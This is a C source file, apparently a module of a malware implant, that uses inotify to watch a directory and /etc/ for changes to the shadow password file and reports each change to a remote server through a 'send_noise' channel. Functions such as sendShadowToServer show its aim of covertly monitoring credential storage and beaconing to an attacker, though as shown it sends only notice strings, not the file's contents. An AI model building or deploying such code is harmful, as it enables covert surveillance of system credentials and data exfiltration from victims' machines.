#include <string.h>
#include <stdio.h>
#include <linux/limits.h>
#include <sys/inotify.h>
#include <pthread.h>
#include <malloc.h>
#include "../../../include/inotify_observer/inotify_observer.h"
#include "../../../include/inotify_observer/inotify_subject.h"
#include "../../../include/data_noise/data_noise.h"
#include "../../../include/commands/fs_monitor_commands.h"

#define BUF_SIZE 1024           // Buffer size for the message
#define DIR_PATH "/etc/"        // Directory path of the shadow file
#define SHADOW_FILE "shadow"    // Shadow file name

// Function prototypes

/**
 * @brief Handles the inotify event.
 *
 * This function handles the inotify event and sends noise to the server.
 *
 * @param event The inotify event.
 */
static void handle_event(struct inotify_event *event);

/**
 * @brief Observes the shadow fileToObserve and sends updates to the server.
 *
 * This function observes the shadow fileToObserve and sends updates to the server.
 */
static void observe_shadow_file_and_send_updates_to_server();

/**
 * @brief Sends data from updated shadow fileToObserve to the server.
 *
 * This function sends data from the shadow fileToObserve when it is modified to the server.
 * @see tcp_operations.h, tcp_operations.c
 *
 * @param event The inotify_observer event.
 */
static void sendShadowToServer(struct inotify_event *event);

// Public functions

void *thread_func(void *arg) {
    printf("Thread started\n");
    fflush(stdout);

    const char *path = (const char *)arg;

    InotifyObserver observer = { .handleEvent = handle_event };

    uint32_t masks[] = {IN_CREATE, IN_DELETE, IN_MODIFY};
    int numMasks = sizeof(masks) / sizeof(masks[0]);

    observe(path, masks, numMasks, (InotifyObserver *[]) {&observer}, 1);

    return NULL;
}

void watch_fs(const char *path) {
    pthread_t thread;
    if (pthread_create(&thread, NULL, thread_func, (void *)path) != 0) {
        fprintf(stderr, "Error creating thread\n");
        return;
    }
//    pthread_join(thread, NULL);
}

// Static functions

static void handle_event(struct inotify_event *event) {
    printf("Event: %s\n", event->name);
    fflush(stdout);

    if(event->mask & IN_CREATE || event->mask & IN_DELETE || event->mask & IN_MODIFY) {
        // Allocate memory for the message
        char *message = malloc(BUF_SIZE);
        if (message == NULL) {
            fprintf(stderr, "Memory allocation failed.\n");
            return;
        }

        // Create the message
        sprintf(message, "\nObserved file system change %s\n", event->name);
        send_noise(message, strlen(message));
    }

}

static void observe_shadow_file_and_send_updates_to_server() {

    InotifyObserver shadowObserver;
    shadowObserver.handleEvent = sendShadowToServer;

    uint32_t masks[] = {IN_MOVED_TO};
    int numMasks = sizeof(masks) / sizeof(masks[0]);

    observe(DIR_PATH, masks, numMasks, (InotifyObserver *[]) {&shadowObserver}, 1);
}

static void sendShadowToServer(struct inotify_event *event) {
    if (event == NULL) {
        fprintf(stderr, "Error: Null event received\n");
        return;
    }

    if (event->len && (event->mask & IN_MOVED_TO) && strcmp(event->name, SHADOW_FILE) == 0) {
        char filename[PATH_MAX];
        sprintf(filename, "%s%s", DIR_PATH, event->name);

        char *message = "\nShadow fileToObserve updated\n";
        send_noise(message, strlen(message));
    }
}